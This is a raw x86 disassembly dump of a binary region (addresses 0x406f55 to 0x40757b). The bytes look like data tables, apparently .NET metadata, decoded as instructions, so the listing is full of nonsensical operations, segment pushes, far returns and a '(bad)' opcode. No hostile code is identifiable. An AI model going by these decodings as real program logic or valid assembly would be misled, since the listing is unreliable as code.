  406f55:	00 a7 0e 29 03 12    	add    %ah,0x1203290e(%edi)
  406f5b:	00 b4 0e 02 07 0a 00 	add    %dh,0xa0702(%esi,%ecx,1)
  406f62:	bb 0e 13 00 12       	mov    $0x1200130e,%ebx
  406f67:	00 c9                	add    %cl,%cl
  406f69:	0e                   	push   %cs
  406f6a:	02 07                	add    (%edi),%al
  406f6c:	12 00                	adc    (%eax),%al
  406f6e:	d3 0e                	rorl   %cl,(%esi)
  406f70:	02 07                	add    (%edi),%al
  406f72:	0e                   	push   %cs
  406f73:	00 d9                	add    %bl,%cl
  406f75:	0e                   	push   %cs
  406f76:	d0 03                	rolb   $1,(%ebx)
  406f78:	06                   	push   %es
  406f79:	00 ea                	add    %ch,%dl
  406f7b:	0e                   	push   %cs
  406f7c:	36 01 06             	add    %eax,%ss:(%esi)
  406f7f:	00 06                	add    %al,(%esi)
  406f81:	0f f3 0e             	psllq  (%esi),%mm1
  406f84:	0a 00                	or     (%eax),%al
  406f86:	12 0f                	adc    (%edi),%cl
  406f88:	13 00                	adc    (%eax),%eax
  406f8a:	0a 00                	or     (%eax),%al
  406f8c:	1a 0f                	sbb    (%edi),%cl
  406f8e:	13 00                	adc    (%eax),%eax
  406f90:	16                   	push   %ss
  406f91:	00 e6                	add    %ah,%dh
  406f93:	01 3c 0f             	add    %edi,(%edi,%ecx,1)
  406f96:	0e                   	push   %cs
  406f97:	00 59 0f             	add    %bl,0xf(%ecx)
  406f9a:	e4 02                	in     $0x2,%al
  406f9c:	0a 00                	or     (%eax),%al
  406f9e:	71 0f                	jno    0x406faf
  406fa0:	76 08                	jbe    0x406faa
  406fa2:	16                   	push   %ss
  406fa3:	00 94 0f 3c 0f 16 00 	add    %dl,0x160f3c(%edi,%ecx,1)
  406faa:	db 0f                	fisttpl (%edi)
  406fac:	3c 0f                	cmp    $0xf,%al
  406fae:	06                   	push   %es
  406faf:	00 ef                	add    %ch,%bh
  406fb1:	0f 36                	(bad)
  406fb3:	01 06                	add    %eax,(%esi)
  406fb5:	00 08                	add    %cl,(%eax)
  406fb7:	10 36                	adc    %dh,(%esi)
  406fb9:	01 0a                	add    %ecx,(%edx)
  406fbb:	00 32                	add    %dh,(%edx)
  406fbd:	10 13                	adc    %dl,(%ebx)
  406fbf:	00 06                	add    %al,(%esi)
  406fc1:	00 4b 10             	add    %cl,0x10(%ebx)
  406fc4:	36 01 0a             	add    %ecx,%ss:(%edx)
  406fc7:	00 59 10             	add    %bl,0x10(%ecx)
  406fca:	13 00                	adc    (%eax),%eax
  406fcc:	06                   	push   %es
  406fcd:	00 79 11             	add    %bh,0x11(%ecx)
  406fd0:	29 03                	sub    %eax,(%ebx)
  406fd2:	06                   	push   %es
  406fd3:	00 f5                	add    %dh,%ch
  406fd5:	11 29                	adc    %ebp,(%ecx)
  406fd7:	03 0a                	add    (%edx),%ecx
  406fd9:	00 ff                	add    %bh,%bh
  406fdb:	11 0f                	adc    %ecx,(%edi)
  406fdd:	01 0a                	add    %ecx,(%edx)
  406fdf:	00 2f                	add    %ch,(%edi)
  406fe1:	12 0e                	adc    (%esi),%cl
  406fe3:	12 12                	adc    (%edx),%dl
  406fe5:	00 75 12             	add    %dh,0x12(%ebp)
  406fe8:	02 07                	add    (%edi),%al
  406fea:	83 01 7b             	addl   $0x7b,(%ecx)
  406fed:	12 00                	adc    (%eax),%al
  406fef:	00 06                	add    %al,(%esi)
  406ff1:	00 92 12 36 01 12    	add    %dl,0x12013612(%edx)
  406ff7:	00 ab 12 25 07 0a    	add    %ch,0xa072512(%ebx)
  406ffd:	00 c4                	add    %al,%ah
  406fff:	12 13                	adc    (%ebx),%dl
  407001:	00 06                	add    %al,(%esi)
  407003:	00 e7                	add    %ah,%bh
  407005:	12 29                	adc    (%ecx),%ch
  407007:	03 0a                	add    (%edx),%ecx
  407009:	00 50 13             	add    %dl,0x13(%eax)
  40700c:	0f 01 06             	sgdtl  (%esi)
  40700f:	00 7a 13             	add    %bh,0x13(%edx)
  407012:	6a 13                	push   $0x13
  407014:	06                   	push   %es
  407015:	00 8c 13 f3 0e 0a 00 	add    %cl,0xa0ef3(%ebx,%edx,1)
  40701c:	bb 13 0f 01 16       	mov    $0x16010f13,%ebx
  407021:	00 cf                	add    %cl,%bh
  407023:	13 3c 0f             	adc    (%edi,%ecx,1),%edi
  407026:	16                   	push   %ss
  407027:	00 da                	add    %bl,%dl
  407029:	13 3c 0f             	adc    (%edi,%ecx,1),%edi
  40702c:	06                   	push   %es
  40702d:	00 0e                	add    %cl,(%esi)
  40702f:	14 29                	adc    $0x29,%al
  407031:	03 06                	add    (%esi),%eax
  407033:	00 3d 14 36 01 06    	add    %bh,0x6013614
  407039:	00 43 14             	add    %al,0x14(%ebx)
  40703c:	29 03                	sub    %eax,(%ebx)
  40703e:	06                   	push   %es
  40703f:	00 68 14             	add    %ch,0x14(%eax)
  407042:	4d                   	dec    %ebp
  407043:	14 06                	adc    $0x6,%al
  407045:	00 76 14             	add    %dh,0x14(%esi)
  407048:	29 03                	sub    %eax,(%ebx)
  40704a:	06                   	push   %es
  40704b:	00 9f 14 80 14 06    	add    %bl,0x6148014(%edi)
  407051:	00 cd                	add    %cl,%ch
  407053:	14 95                	adc    $0x95,%al
  407055:	09 06                	or     %eax,(%esi)
  407057:	00 f8                	add    %bh,%al
  407059:	14 ff                	adc    $0xff,%al
  40705b:	08 06                	or     %al,(%esi)
  40705d:	00 19                	add    %bl,(%ecx)
  40705f:	15 95 09 06 00       	adc    $0x60995,%eax
  407064:	2c 15                	sub    $0x15,%al
  407066:	95                   	xchg   %eax,%ebp
  407067:	09 06                	or     %eax,(%esi)
  407069:	00 52 15             	add    %dl,0x15(%edx)
  40706c:	46                   	inc    %esi
  40706d:	15 06 00 e8 15       	adc    $0x15e80006,%eax
  407072:	cb                   	lret
  407073:	15 06 00 01 16       	adc    $0x16010006,%eax
  407078:	46                   	inc    %esi
  407079:	15 06 00 19 16       	adc    $0x16190006,%eax
  40707e:	cb                   	lret
  40707f:	15 06 00 6f 16       	adc    $0x166f0006,%eax
  407084:	5d                   	pop    %ebp
  407085:	16                   	push   %ss
  407086:	06                   	push   %es
  407087:	00 76 16             	add    %dh,0x16(%esi)
  40708a:	5d                   	pop    %ebp
  40708b:	16                   	push   %ss
  40708c:	06                   	push   %es
  40708d:	00 bb 16 cb 15 06    	add    %bh,0x615cb16(%ebx)
  407093:	00 cb                	add    %cl,%bl
  407095:	16                   	push   %ss
  407096:	cb                   	lret
  407097:	15 06 00 dc 16       	adc    $0x16dc0006,%eax
  40709c:	cb                   	lret
  40709d:	15 06 00 f7 16       	adc    $0x16f70006,%eax
  4070a2:	cb                   	lret
  4070a3:	15 06 00 6b 17       	adc    $0x176b0006,%eax
  4070a8:	51                   	push   %ecx
  4070a9:	17                   	pop    %ss
  4070aa:	06                   	push   %es
  4070ab:	00 86 17 51 17 06    	add    %al,0x6175117(%esi)
  4070b1:	00 97 17 51 17 1a    	add    %dl,0x1a175117(%edi)
  4070b7:	00 c5                	add    %al,%ch
  4070b9:	17                   	pop    %ss
  4070ba:	b3 17                	mov    $0x17,%bl
  4070bc:	1a 00                	sbb    (%eax),%al
  4070be:	de 17                	ficoms (%edi)
  4070c0:	b3 17                	mov    $0x17,%bl
  4070c2:	1a 00                	sbb    (%eax),%al
  4070c4:	f3 17                	repz pop %ss
  4070c6:	b3 17                	mov    $0x17,%bl
  4070c8:	17                   	pop    %ss
  4070c9:	02 0e                	add    (%esi),%cl
  4070cb:	18 00                	sbb    %al,(%eax)
  4070cd:	00 0e                	add    %cl,(%esi)
  4070cf:	00 36                	add    %dh,(%esi)
  4070d1:	18 36                	sbb    %dh,(%esi)
  4070d3:	01 12                	add    %edx,(%edx)
  4070d5:	00 53 18             	add    %dl,0x18(%ebx)
  4070d8:	25 07 12 00 64       	and    $0x64001207,%eax
  4070dd:	18 25 07 12 00 76    	sbb    %ah,0x76001207
  4070e3:	18 02                	sbb    %al,(%edx)
  4070e5:	07                   	pop    %es
  4070e6:	16                   	push   %ss
  4070e7:	00 b9 18 3c 0f 12    	add    %bh,0x120f3c18(%ecx)
  4070ed:	00 e1                	add    %ah,%cl
  4070ef:	18 25 07 06 00 19    	sbb    %ah,0x19000607
  4070f5:	19 ff                	sbb    %edi,%edi
  4070f7:	08 06                	or     %al,(%esi)
  4070f9:	00 39                	add    %bh,(%ecx)
  4070fb:	19 ff                	sbb    %edi,%edi
  4070fd:	08 06                	or     %al,(%esi)
  4070ff:	00 57 19             	add    %dl,0x19(%edi)
  407102:	95                   	xchg   %eax,%ebp
  407103:	09 06                	or     %eax,(%esi)
  407105:	00 65 19             	add    %ah,0x19(%ebp)
  407108:	5d                   	pop    %ebp
  407109:	16                   	push   %ss
  40710a:	06                   	push   %es
  40710b:	00 82 19 5d 16 06    	add    %al,0x6165d19(%edx)
  407111:	00 9d 19 5d 16 06    	add    %bl,0x6165d19(%ebp)
  407117:	00 b8 19 5d 16 06    	add    %bh,0x6165d19(%eax)
  40711d:	00 d1                	add    %dl,%cl
  40711f:	19 5d 16             	sbb    %ebx,0x16(%ebp)
  407122:	06                   	push   %es
  407123:	00 ea                	add    %ch,%dl
  407125:	19 5d 16             	sbb    %ebx,0x16(%ebp)
  407128:	06                   	push   %es
  407129:	00 07                	add    %al,(%edi)
  40712b:	1a 5d 16             	sbb    0x16(%ebp),%bl
  40712e:	00 00                	add    %al,(%eax)
  407130:	00 00                	add    %al,(%eax)
  407132:	01 00                	add    %eax,(%eax)
  407134:	00 00                	add    %al,(%eax)
  407136:	00 00                	add    %al,(%eax)
  407138:	01 00                	add    %eax,(%eax)
  40713a:	01 00                	add    %eax,(%eax)
  40713c:	00 00                	add    %al,(%eax)
  40713e:	00 00                	add    %al,(%eax)
  407140:	29 00                	sub    %eax,(%eax)
  407142:	37                   	aaa
  407143:	00 05 00 01 00 01    	add    %al,0x1000100
  407149:	00 00                	add    %al,(%eax)
  40714b:	00 00                	add    %al,(%eax)
  40714d:	00 3a                	add    %bh,(%edx)
  40714f:	00 37                	add    %dh,(%edi)
  407151:	00 09                	add    %cl,(%ecx)
  407153:	00 01                	add    %al,(%ecx)
  407155:	00 02                	add    %al,(%edx)
  407157:	00 00                	add    %al,(%eax)
  407159:	01 10                	add    %edx,(%eax)
  40715b:	00 45 00             	add    %al,0x0(%ebp)
  40715e:	37                   	aaa
  40715f:	00 0d 00 01 00 03    	add    %cl,0x3000100
  407165:	00 05 01 00 00 4f    	add    %al,0x4f000001
  40716b:	00 00                	add    %al,(%eax)
  40716d:	00 0d 00 05 00 08    	add    %cl,0x8000500
  407173:	00 05 01 00 00 5d    	add    %al,0x5d000001
  407179:	00 00                	add    %al,(%eax)
  40717b:	00 0d 00 05 00 0f    	add    %cl,0xf000500
  407181:	00 01                	add    %al,(%ecx)
  407183:	00 10                	add    %dl,(%eax)
  407185:	00 78 00             	add    %bh,0x0(%eax)
  407188:	81 00 0d 00 06 00    	addl   $0x6000d,(%eax)
  40718e:	11 00                	adc    %eax,(%eax)
  407190:	01 00                	add    %eax,(%eax)
  407192:	00 00                	add    %al,(%eax)
  407194:	86 00                	xchg   %al,(%eax)
  407196:	81 00 0d 00 0f 00    	addl   $0xf000d,(%eax)
  40719c:	13 00                	adc    (%eax),%eax
  40719e:	01 00                	add    %eax,(%eax)
  4071a0:	10 00                	adc    %al,(%eax)
  4071a2:	8b 00                	mov    (%eax),%eax
  4071a4:	81 00 0d 00 0f 00    	addl   $0xf000d,(%eax)
  4071aa:	16                   	push   %ss
  4071ab:	00 01                	add    %al,(%ecx)
  4071ad:	00 10                	add    %dl,(%eax)
  4071af:	00 98 00 81 00 0d    	add    %bl,0xd008100(%eax)
  4071b5:	00 19                	add    %bl,(%ecx)
  4071b7:	00 22                	add    %ah,(%edx)
  4071b9:	00 00                	add    %al,(%eax)
  4071bb:	01 10                	add    %edx,(%eax)
  4071bd:	00 a1 00 81 00 0d    	add    %ah,0xd008100(%ecx)
  4071c3:	00 24 00             	add    %ah,(%eax,%eax,1)
  4071c6:	35 00 01 00 00       	xor    $0x100,%eax
  4071cb:	00 a8 00 81 00 0d    	add    %ch,0xd008100(%eax)
  4071d1:	00 28                	add    %ch,(%eax)
  4071d3:	00 49 00             	add    %cl,0x0(%ecx)
  4071d6:	03 01                	add    (%ecx),%eax
  4071d8:	00 00                	add    %al,(%eax)
  4071da:	b6 00                	mov    $0x0,%dh
  4071dc:	00 00                	add    %al,(%eax)
  4071de:	45                   	inc    %ebp
  4071df:	00 28                	add    %ch,(%eax)
  4071e1:	00 4d 00             	add    %cl,0x0(%ebp)
  4071e4:	00 01                	add    %al,(%ecx)
  4071e6:	00 00                	add    %al,(%eax)
  4071e8:	35 0a 00 00 45       	xor    $0x4500000a,%eax
  4071ed:	00 28                	add    %ch,(%eax)
  4071ef:	00 51 00             	add    %dl,0x0(%ecx)
  4071f2:	05 00 00 00 bf       	add    $0xbf000000,%eax
  4071f7:	0d 00 00 0d 00       	or     $0xd0000,%eax
  4071fc:	28 00                	sub    %al,(%eax)
  4071fe:	55                   	push   %ebp
  4071ff:	00 31                	add    %dh,(%ecx)
  407201:	00 58 01             	add    %bl,0x1(%eax)
  407204:	20 00                	and    %al,(%eax)
  407206:	31 00                	xor    %eax,(%eax)
  407208:	81 01 2d 00 31 00    	addl   $0x31002d,(%ecx)
  40720e:	a3 01 3a 00 31       	mov    %eax,0x31003a01
  407213:	00 c8                	add    %cl,%al
  407215:	01 47 00             	add    %eax,0x0(%edi)
  407218:	11 00                	adc    %eax,(%eax)
  40721a:	6b 02 90             	imul   $0xffffff90,(%edx),%eax
  40721d:	00 16                	add    %dl,(%esi)
  40721f:	00 8b 02 99 00 16    	add    %cl,0x16009902(%ebx)
  407225:	00 90 02 99 00 16    	add    %dl,0x16009902(%eax)
  40722b:	00 95 02 99 00 16    	add    %dl,0x16009902(%ebp)
  407231:	00 99 02 99 00 16    	add    %bl,0x16009902(%ecx)
  407237:	00 9d 02 99 00 36    	add    %bl,0x36009902(%ebp)
  40723d:	00 a3 02 99 00 16    	add    %ah,0x16009902(%ebx)
  407243:	00 c1                	add    %al,%cl
  407245:	02 9c 00 16 00 cb 02 	add    0x2cb0016(%eax,%eax,1),%bl
  40724c:	a0 00 16 00 d0       	mov    0xd0001600,%al
  407251:	02 99 00 16 00 d8    	add    -0x27ffea00(%ecx),%bl
  407257:	02 a0 00 16 00 fe    	add    -0x1ffea00(%eax),%ah
  40725d:	02 a3 00 11 00 00    	add    0x1100(%ebx),%ah
  407263:	03 a7 00 11 00 0d    	add    0xd001100(%edi),%esp
  407269:	03 a0 00 11 00 22    	add    0x22001100(%eax),%esp
  40726f:	03 aa 00 11 00 40    	add    0x40001100(%edx),%ebp
  407275:	03 ae 00 11 00 49    	add    0x49001100(%esi),%ebp
  40727b:	03 b2 00 16 00 5f    	add    0x5f001600(%edx),%esi
  407281:	03 b6 00 11 00 67    	add    0x67001100(%esi),%esi
  407287:	03 ba 00 36 00 99    	add    -0x66ffca00(%edx),%edi
  40728d:	02 ba 00 31 00 99    	add    -0x66ffcf00(%edx),%bh
  407293:	02 ba 00 11 00 eb    	add    -0x14ffef00(%edx),%bh
  407299:	03 d2                	add    %edx,%edx
  40729b:	00 11                	add    %dl,(%ecx)
  40729d:	00 22                	add    %ah,(%edx)
  40729f:	04 e1                	add    $0xe1,%al
  4072a1:	00 16                	add    %dl,(%esi)
  4072a3:	00 9a 04 aa 00 16    	add    %bl,0x1600aa04(%edx)
  4072a9:	00 9f 04 aa 00 16    	add    %bl,0x1600aa04(%edi)
  4072af:	00 a4 04 aa 00 16 00 	add    %ah,0x1600aa(%esp,%eax,1)
  4072b6:	fc                   	cld
  4072b7:	04 e1                	add    $0xe1,%al
  4072b9:	00 16                	add    %dl,(%esi)
  4072bb:	00 02                	add    %al,(%edx)
  4072bd:	05 e1 00 16 00       	add    $0x1600e1,%eax
  4072c2:	0c 05                	or     $0x5,%al
  4072c4:	fc                   	cld
  4072c5:	00 16                	add    %dl,(%esi)
  4072c7:	00 60 05             	add    %ah,0x5(%eax)
  4072ca:	0c 01                	or     $0x1,%al
  4072cc:	16                   	push   %ss
  4072cd:	00 aa 05 e1 00 31    	add    %ch,0x3100e105(%edx)
  4072d3:	00 90 06 56 01 16    	add    %dl,0x16015606(%eax)
  4072d9:	00 9b 06 99 00 16    	add    %bl,0x16009906(%ebx)
  4072df:	00 a2 06 99 00 16    	add    %ah,0x16009906(%edx)
  4072e5:	00 ab 06 fc 00 06    	add    %ch,0x600fc06(%ebx)
  4072eb:	00 cc                	add    %cl,%ah
  4072ed:	0d 56 01 50 20       	or     $0x20500156,%eax
  4072f2:	00 00                	add    %al,(%eax)
  4072f4:	00 00                	add    %al,(%eax)
  4072f6:	06                   	push   %es
  4072f7:	18 09                	sbb    %cl,(%ecx)
  4072f9:	01 13                	add    %edx,(%ebx)
  4072fb:	00 01                	add    %al,(%ecx)
  4072fd:	00 58 20             	add    %bl,0x20(%eax)
  407300:	00 00                	add    %al,(%eax)
  407302:	00 00                	add    %al,(%eax)
  407304:	06                   	push   %es
  407305:	18 09                	sbb    %cl,(%ecx)
  407307:	01 13                	add    %edx,(%ebx)
  407309:	00 01                	add    %al,(%ecx)
  40730b:	00 60 20             	add    %ah,0x20(%eax)
  40730e:	00 00                	add    %al,(%eax)
  407310:	00 00                	add    %al,(%eax)
  407312:	11 18                	adc    %ebx,(%eax)
  407314:	44                   	inc    %esp
  407315:	01 17                	add    %edx,(%edi)
  407317:	00 01                	add    %al,(%ecx)
  407319:	00 8c 20 00 00 00 00 	add    %cl,0x0(%eax,%eiz,1)
  407320:	13 08                	adc    (%eax),%ecx
  407322:	4b                   	dec    %ebx
  407323:	01 1b                	add    %ebx,(%ebx)
  407325:	00 01                	add    %al,(%ecx)
  407327:	00 a8 20 00 00 00    	add    %ch,0x20(%eax)
  40732d:	00 13                	add    %dl,(%ebx)
  40732f:	08 71 01             	or     %dh,0x1(%ecx)
  407332:	28 00                	sub    %al,(%eax)
  407334:	01 00                	add    %eax,(%eax)
  407336:	c4 20                	les    (%eax),%esp
  407338:	00 00                	add    %al,(%eax)
  40733a:	00 00                	add    %al,(%eax)
  40733c:	13 08                	adc    (%eax),%ecx
  40733e:	9a 01 35 00 01 00 e0 	lcall  $0xe000,$0x1003501
  407345:	20 00                	and    %al,(%eax)
  407347:	00 00                	add    %al,(%eax)
  407349:	00 13                	add    %dl,(%ebx)
  40734b:	08 b8 01 42 00 01    	or     %bh,0x1004201(%eax)
  407351:	00 fc                	add    %bh,%ah
  407353:	20 00                	and    %al,(%eax)
  407355:	00 00                	add    %al,(%eax)
  407357:	00 46 02             	add    %al,0x2(%esi)
  40735a:	fe 01                	incb   (%ecx)
  40735c:	63 00                	arpl   %eax,(%eax)
  40735e:	01 00                	add    %eax,(%eax)
  407360:	1c 21                	sbb    $0x21,%al
  407362:	00 00                	add    %al,(%eax)
  407364:	00 00                	add    %al,(%eax)
  407366:	46                   	inc    %esi
  407367:	02 07                	add    (%edi),%al
  407369:	02 68 00             	add    0x0(%eax),%ch
  40736c:	02 00                	add    (%eax),%al
  40736e:	34 21                	xor    $0x21,%al
  407370:	00 00                	add    %al,(%eax)
  407372:	00 00                	add    %al,(%eax)
  407374:	83 00 18             	addl   $0x18,(%eax)
  407377:	02 6c 00 02          	add    0x2(%eax,%eax,1),%ch
  40737b:	00 50 21             	add    %dl,0x21(%eax)
  40737e:	00 00                	add    %al,(%eax)
  407380:	00 00                	add    %al,(%eax)
  407382:	46                   	inc    %esi
  407383:	02 20                	add    (%eax),%ah
  407385:	02 71 00             	add    0x0(%ecx),%dh
  407388:	02 00                	add    (%eax),%al
  40738a:	68 21 00 00 00       	push   $0x21
  40738f:	00 11                	add    %dl,(%ecx)
  407391:	00 29                	add    %ch,(%ecx)
  407393:	02 78 00             	add    0x0(%eax),%bh
  407396:	02 00                	add    (%eax),%al
  407398:	8c 21                	mov    %fs,(%ecx)
  40739a:	00 00                	add    %al,(%eax)
  40739c:	00 00                	add    %al,(%eax)
  40739e:	01 00                	add    %eax,(%eax)
  4073a0:	47                   	inc    %edi
  4073a1:	02 80 00 03 00 a8    	add    -0x57fffd00(%eax),%al
  4073a7:	21 00                	and    %eax,(%eax)
  4073a9:	00 00                	add    %al,(%eax)
  4073ab:	00 06                	add    %al,(%esi)
  4073ad:	18 09                	sbb    %cl,(%ecx)
  4073af:	01 13                	add    %edx,(%ebx)
  4073b1:	00 04 00             	add    %al,(%eax,%eax,1)
  4073b4:	b0 21                	mov    $0x21,%al
  4073b6:	00 00                	add    %al,(%eax)
  4073b8:	00 00                	add    %al,(%eax)
  4073ba:	03 08                	add    (%eax),%ecx
  4073bc:	5b                   	pop    %ebx
  4073bd:	02 8b 00 04 00 dc    	add    -0x23fffc00(%ebx),%cl
  4073c3:	21 00                	and    %eax,(%eax)
  4073c5:	00 00                	add    %al,(%eax)
  4073c7:	00 06                	add    %al,(%esi)
  4073c9:	18 09                	sbb    %cl,(%ecx)
  4073cb:	01 13                	add    %edx,(%ebx)
  4073cd:	00 04 00             	add    %al,(%eax,%eax,1)
  4073d0:	e4 21                	in     $0x21,%al
  4073d2:	00 00                	add    %al,(%eax)
  4073d4:	00 00                	add    %al,(%eax)
  4073d6:	11 18                	adc    %ebx,(%eax)
  4073d8:	44                   	inc    %esp
  4073d9:	01 17                	add    %edx,(%edi)
  4073db:	00 04 00             	add    %al,(%eax,%eax,1)
  4073de:	44                   	inc    %esp
  4073df:	22 00                	and    (%eax),%al
  4073e1:	00 00                	add    %al,(%eax)
  4073e3:	00 06                	add    %al,(%esi)
  4073e5:	18 09                	sbb    %cl,(%ecx)
  4073e7:	01 13                	add    %edx,(%ebx)
  4073e9:	00 04 00             	add    %al,(%eax,%eax,1)
  4073ec:	4c                   	dec    %esp
  4073ed:	22 00                	and    (%eax),%al
  4073ef:	00 00                	add    %al,(%eax)
  4073f1:	00 06                	add    %al,(%esi)
  4073f3:	18 09                	sbb    %cl,(%ecx)
  4073f5:	01 13                	add    %edx,(%ebx)
  4073f7:	00 04 00             	add    %al,(%eax,%eax,1)
  4073fa:	54                   	push   %esp
  4073fb:	22 00                	and    (%eax),%al
  4073fd:	00 00                	add    %al,(%eax)
  4073ff:	00 16                	add    %dl,(%esi)
  407401:	00 86 00 17 00 04    	add    %al,0x4001700(%esi)
  407407:	00 f0                	add    %dh,%al
  407409:	22 00                	and    (%eax),%al
  40740b:	00 00                	add    %al,(%eax)
  40740d:	00 11                	add    %dl,(%ecx)
  40740f:	08 4c 0a 17          	or     %cl,0x17(%edx,%ecx,1)
  407413:	00 04 00             	add    %al,(%eax,%eax,1)
  407416:	2c 23                	sub    $0x23,%al
  407418:	00 00                	add    %al,(%eax)
  40741a:	00 00                	add    %al,(%eax)
  40741c:	11 18                	adc    %ebx,(%eax)
  40741e:	44                   	inc    %esp
  40741f:	01 17                	add    %edx,(%edi)
  407421:	00 04 00             	add    %al,(%eax,%eax,1)
  407424:	7c 23                	jl     0x407449
  407426:	00 00                	add    %al,(%eax)
  407428:	00 00                	add    %al,(%eax)
  40742a:	06                   	push   %es
  40742b:	18 09                	sbb    %cl,(%ecx)
  40742d:	01 13                	add    %edx,(%ebx)
  40742f:	00 04 00             	add    %al,(%eax,%eax,1)
  407432:	84 23                	test   %ah,(%ebx)
  407434:	00 00                	add    %al,(%eax)
  407436:	00 00                	add    %al,(%eax)
  407438:	16                   	push   %ss
  407439:	00 70 03             	add    %dh,0x3(%eax)
  40743c:	17                   	pop    %ss
  40743d:	00 04 00             	add    %al,(%eax,%eax,1)
  407440:	d4 24                	aam    $0x24
  407442:	00 00                	add    %al,(%eax)
  407444:	00 00                	add    %al,(%eax)
  407446:	16                   	push   %ss
  407447:	00 7d 03             	add    %bh,0x3(%ebp)
  40744a:	bd 00 04 00 48       	mov    $0x48000400,%ebp
  40744f:	26 00 00             	add    %al,%es:(%eax)
  407452:	00 00                	add    %al,(%eax)
  407454:	16                   	push   %ss
  407455:	00 8f 03 c1 00 04    	add    %cl,0x400c103(%edi)
  40745b:	00 1c 28             	add    %bl,(%eax,%ebp,1)
  40745e:	00 00                	add    %al,(%eax)
  407460:	00 00                	add    %al,(%eax)
  407462:	16                   	push   %ss
  407463:	00 9f 03 c7 00 05    	add    %bl,0x500c703(%edi)
  407469:	00 50 28             	add    %dl,0x28(%eax)
  40746c:	00 00                	add    %al,(%eax)
  40746e:	00 00                	add    %al,(%eax)
  407470:	16                   	push   %ss
  407471:	00 ab 03 cd 00 06    	add    %ch,0x600cd03(%ebx)
  407477:	00 50 29             	add    %dl,0x29(%eax)
  40747a:	00 00                	add    %al,(%eax)
  40747c:	00 00                	add    %al,(%eax)
  40747e:	16                   	push   %ss
  40747f:	00 b4 03 c1 00 07 00 	add    %dh,0x700c1(%ebx,%eax,1)
  407486:	90                   	nop
  407487:	29 00                	sub    %eax,(%eax)
  407489:	00 00                	add    %al,(%eax)
  40748b:	00 16                	add    %dl,(%esi)
  40748d:	00 bc 03 17 00 08 00 	add    %bh,0x80017(%ebx,%eax,1)
  407494:	54                   	push   %esp
  407495:	2a 00                	sub    (%eax),%al
  407497:	00 00                	add    %al,(%eax)
  407499:	00 16                	add    %dl,(%esi)
  40749b:	00 cb                	add    %cl,%bl
  40749d:	03 17                	add    (%edi),%edx
  40749f:	00 08                	add    %cl,(%eax)
  4074a1:	00 98 2a 00 00 00    	add    %bl,0x2a(%eax)
  4074a7:	00 11                	add    %dl,(%ecx)
  4074a9:	08 84 0b 68 03 08 00 	or     %al,0x80368(%ebx,%ecx,1)
  4074b0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4074b1:	2a 00                	sub    (%eax),%al
  4074b3:	00 00                	add    %al,(%eax)
  4074b5:	00 11                	add    %dl,(%ecx)
  4074b7:	08 93 0b 68 03 09    	or     %dl,0x903680b(%ebx)
  4074bd:	00 b4 2a 00 00 00 00 	add    %dh,0x0(%edx,%ebp,1)
  4074c4:	11 18                	adc    %ebx,(%eax)
  4074c6:	44                   	inc    %esp
  4074c7:	01 17                	add    %edx,(%edi)
  4074c9:	00 0a                	add    %cl,(%edx)
  4074cb:	00 c8                	add    %cl,%al
  4074cd:	2a 00                	sub    (%eax),%al
  4074cf:	00 00                	add    %al,(%eax)
  4074d1:	00 06                	add    %al,(%esi)
  4074d3:	18 09                	sbb    %cl,(%ecx)
  4074d5:	01 13                	add    %edx,(%ebx)
  4074d7:	00 0a                	add    %cl,(%edx)
  4074d9:	00 d0                	add    %dl,%al
  4074db:	2a 00                	sub    (%eax),%al
  4074dd:	00 00                	add    %al,(%eax)
  4074df:	00 11                	add    %dl,(%ecx)
  4074e1:	08 f6                	or     %dh,%dh
  4074e3:	03 d6                	add    %esi,%edx
  4074e5:	00 0a                	add    %cl,(%edx)
  4074e7:	00 e8                	add    %ch,%al
  4074e9:	2a 00                	sub    (%eax),%al
  4074eb:	00 20                	add    %ah,(%eax)
  4074ed:	00 11                	add    %dl,(%ecx)
  4074ef:	08 04 04             	or     %al,(%esp,%eax,1)
  4074f2:	db 00                	fildl  (%eax)
  4074f4:	0a 00                	or     (%eax),%al
  4074f6:	50                   	push   %eax
  4074f7:	2b 00                	sub    (%eax),%eax
  4074f9:	00 00                	add    %al,(%eax)
  4074fb:	00 16                	add    %dl,(%esi)
  4074fd:	00 2c 04             	add    %ch,(%esp,%eax,1)
  407500:	cd 00                	int    $0x0
  407502:	0b 00                	or     (%eax),%eax
  407504:	c0 2b 00             	shrb   $0x0,(%ebx)
  407507:	00 00                	add    %al,(%eax)
  407509:	00 11                	add    %dl,(%ecx)
  40750b:	00 58 04             	add    %bl,0x4(%eax)
  40750e:	e4 00                	in     $0x0,%al
  407510:	0c 00                	or     $0x0,%al
  407512:	dc 2b                	fsubrl (%ebx)
  407514:	00 00                	add    %al,(%eax)
  407516:	00 00                	add    %al,(%eax)
  407518:	11 00                	adc    %eax,(%eax)
  40751a:	7d 04                	jge    0x407520
  40751c:	e4 00                	in     $0x0,%al
  40751e:	0e                   	push   %cs
  40751f:	00 f4                	add    %dh,%ah
  407521:	2b 00                	sub    (%eax),%eax
  407523:	00 48 00             	add    %cl,0x0(%eax)
  407526:	16                   	push   %ss
  407527:	00 ab 04 c7 00 10    	add    %ch,0x1000c704(%ebx)
  40752d:	00 00                	add    %al,(%eax)
  40752f:	00 00                	add    %al,(%eax)
  407531:	00 80 00 16 20 b0    	add    %al,-0x4fdfea00(%eax)
  407537:	04 eb                	add    $0xeb,%al
  407539:	00 11                	add    %dl,(%ecx)
  40753b:	00 00                	add    %al,(%eax)
  40753d:	00 00                	add    %al,(%eax)
  40753f:	00 80 00 13 20 e6    	add    %al,-0x19dfed00(%eax)
  407545:	04 f4                	add    $0xf4,%al
  407547:	00 16                	add    %dl,(%esi)
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 00                	add    %al,(%eax)
  40754d:	00 80 00 16 20 0f    	add    %al,0xf201600(%eax)
  407553:	05 00 01 1a 00       	add    $0x1a0100,%eax
  407558:	00 00                	add    %al,(%eax)
  40755a:	00 00                	add    %al,(%eax)
  40755c:	80 00 16             	addb   $0x16,(%eax)
  40755f:	20 67 05             	and    %ah,0x5(%edi)
  407562:	0f 01 22             	smsw   (%edx)
  407565:	00 88 5f 00 00 00    	add    %cl,0x5f(%eax)
  40756b:	00 16                	add    %dl,(%esi)
  40756d:	00 a6 05 1a 01 27    	add    %ah,0x27011a05(%esi)
  407573:	00 e4                	add    %ah,%ah
  407575:	5f                   	pop    %edi
  407576:	00 00                	add    %al,(%eax)
  407578:	00 00                	add    %al,(%eax)
  40757a:	16                   	push   %ss
  40757b:	00 af 05 1e 01 27    	add    %ch,0x27011e05(%edi)
